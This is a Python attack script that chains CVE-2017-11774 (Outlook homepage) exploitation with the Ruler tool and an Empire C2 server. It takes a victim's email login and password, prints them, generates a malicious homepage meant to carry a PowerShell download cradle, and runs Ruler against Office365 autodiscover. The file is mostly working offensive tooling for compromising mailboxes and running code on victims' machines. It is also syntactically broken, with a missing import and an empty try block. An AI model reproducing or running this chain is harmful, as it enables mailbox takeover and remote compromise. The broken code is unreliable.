from ruler_helper import *
#from restful import * will be added in a few weeks
from spotter import *
import os
import subprocess
#load empire in a separate terminal and run this on another tmux works ;)
#make sure to save ruler under the name u specify and change in tool
def dirty_work(username_rest,password_rest,rest_ip,rest_port,name,target_name,target_email,homepage,owa_user,owa_passwd,autodiscover_url,ps_cradle):

    
     try:
         print('-'*50)
         print('Generating Restful Client Interface')
         print('-'*50)
         RestFul_Interface =  Restful_Client(username_rest,password_rest,rest_ip,rest_port)# for post exploitation
         #now we have a connected object with a token so we can interact with the restful api 
         print(RestFul_Interface)
         print('-'*50)
         print('Generating CVE-2017-11774 Outlook Attack Chain')
         print('-'*50)
         Attack_Chain_Tool = Attack_Chain(name,target_name,target_email,homepage,owa_user,owa_passwd,autodiscover_url)
         name = Attack_Chain_Tool.name
         target_username =  Attack_Chain_Tool.username
         target_password =  Attack_Chain_Tool.password
         target_name = Attack_Chain_Tool.target_name
         email = Attack_Chain_Tool.email
         homepage = Attack_Chain_Tool.homepage
         hosts_location_loot = Attack_Chain_Tool.hosts_location_loot
         autodiscover_url = Attack_Chain_Tool.autodiscover
         

      
         print("Name: "+name)
         print("Target Name: "+target_name)
         print("Target Username: "+target_username)
         print("Target Password: "+target_password)
         print("Target Email: "+email)
         print("Target HomePage: "+homepage)
         print("Target Loot Location: "+hosts_location_loot)
         print("Target Autodiscover Url: "+autodiscover_url)
         print('-'*50+"\n")
         #now we need to set up the post exploitation part to get a stager to use here
         print('Generating malicious HomePage Vector')
         home_page_path,external_page = Attack_Chain_Tool.gen_homepage_path()
         #print('Homepage Location: '+home_page_path)
         page_result,ruler_command  = Attack_Chain_Tool.gen_page_normal(ps_cradle)
         return page_result,ruler_command,home_page_path,external_page,Attack_Chain_Tool
      
     except:
        pass


def main():
   empire_pass = sys.argv[1]
   ip_c2 =  sys.argv[2]
   vic_email = sys.argv[3]
   vic_login = sys.argv[4]
   mail_pass = sys.argv[5]

   try:
       mal_page,command_ruler,home_page_path,external_page,Attack_Chain_Tool = dirty_work('empireadmin',empire_pass,ip_c2,'1337','test','test victim',vic_email,'http://192.168.1.1',vic_login,mail_pass,'https://outlook.office365.com',"\"POWERSHELL CODE GOESSS HERE !!\"")

       print(mal_page)
       try:
          result = " ".join(str(x) for x in command_ruler)
          print(result)
          ruler_output = Attack_Chain_Tool.ruler_execute(result)
          print(ruler_output)
       except:
          print("")
          pass
   except:
       pass

   try:
   
   except:
      pass

main()
